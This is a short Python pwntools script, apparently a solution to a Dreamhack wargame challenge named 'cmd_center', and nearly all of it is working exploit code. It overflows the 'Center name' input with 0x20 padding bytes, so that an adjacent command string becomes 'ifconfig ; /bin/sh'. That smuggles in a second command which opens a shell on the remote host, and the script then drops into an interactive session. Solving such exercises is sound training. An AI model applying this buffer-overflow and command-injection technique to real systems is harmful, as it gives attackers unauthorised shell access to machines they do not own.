from pwn import *

#p = process('./cmd_center')
p = remote('host3.dreamhack.games', 12365)

#cmd_ip_offset = 0x110
#center_name_offset = 0x130
payload = b'A'*0x20 + b'ifconfig ; /bin/sh'

p.sendlineafter(b'Center name: ', payload)

p.interactive()
